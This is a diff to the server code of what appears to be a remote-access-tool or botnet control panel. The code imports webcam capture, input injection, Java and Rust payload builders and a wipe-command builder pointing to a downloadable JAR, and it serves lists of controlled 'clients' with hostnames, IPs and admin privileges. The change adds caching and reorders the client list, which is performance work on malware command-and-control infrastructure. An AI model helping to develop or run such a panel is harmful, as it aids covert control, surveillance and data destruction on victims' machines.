@@ -17,7 +17,7 @@ import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMo
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
 import { buildJavaPayload } from './builder/java_build.js';
-import { getCachedUser, invalidateUser, userCacheById, userCacheByKey } from './cache.js';
+import { getCachedUser, invalidateUser, userCacheById, userCacheByKey, getCache, setCache, clearCache } from './cache.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -191,7 +191,6 @@ async function getOwnUser(uid) {
   return await getCachedUser(uid);
 }
 
-// ─── wipe command builder ────────────────────────────────────────────────────
 function buildWipeCommand(serverBase) {
   const stUrl = `${serverBase}/api/downloads/st.jar`;
 
@@ -440,6 +439,10 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   const now    = Date.now();
   const cutoff = now - 30_000;
 
+  const cacheKey = `clients:${req.user.uid}:${status}:${q}:${limitN}:${offset}`;
+  const cached = getCache(cacheKey);
+  if (cached) return res.json(cached);
+
   const filters = ['user_id = ?'];
   const params  = [req.user.uid];
 
@@ -457,14 +460,14 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   const [rows] = await db.query(`
     SELECT id, hostname, ip, last_seen FROM clients
     WHERE ${where}
-    ORDER BY ((id * 1103515245 + user_id * 12345) % 2147483647) ASC
+    ORDER BY last_seen DESC
     LIMIT ? OFFSET ?
   `, [...params, limitN, offset]);
 
   const [onlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`, [req.user.uid, cutoff]);
   const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`, [req.user.uid, cutoff]);
 
-  res.json({
+  const payload = {
     total:   Number(totalRow.n),
     online:  Number(onlineRows[0].n),
     offline: Number(offlineRows[0].n),
@@ -478,7 +481,10 @@ app.get('/api/clients', requireAuth, async (req, res) => {
       privileges: 'admin',
       ping: getPing(r.id),
     })),
-  });
+  };
+
+  setCache(cacheKey, payload, 5000); // Cache for 5 seconds
+  res.json(payload);
 });
 
 app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
@@ -577,6 +583,7 @@ app.delete('/api/clients/:id', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
   const [info] = await db.query(`DELETE FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
   if (info.affectedRows === 0) return res.status(404).json({ error: 'not found' });
+  clearCache(`clients:${req.user.uid}`);
   res.json({ ok: true });
 });
 
@@ -1039,6 +1046,10 @@ app.get('/api/admin2/me', limitAdmin2Api, requireAdmin2, (req, res) => {
 app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, async (req, res) => {
   res.setHeader('Cache-Control', 'no-store');
 
+  const cacheKey = 'admin2:stats';
+  const cached = getCache(cacheKey);
+  if (cached) return res.json(cached);
+
   const now = Date.now();
   const cutoff = now - 30_000;
 
@@ -1054,7 +1065,7 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, async (req, res) => 
     LIMIT 500
   `);
 
-  res.json({
+  const payload = {
     total:   Number(totalRows[0].n),
     online:  Number(onlineRows[0].n),
     offline: Number(offlineRows[0].n),
@@ -1067,7 +1078,10 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, async (req, res) => 
       lastSeen: r.last_seen,
       createdAt: r.last_seen, 
     })),
-  });
+  };
+
+  setCache(cacheKey, payload, 10000); // 10s cache for global stats
+  res.json(payload);
 });
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
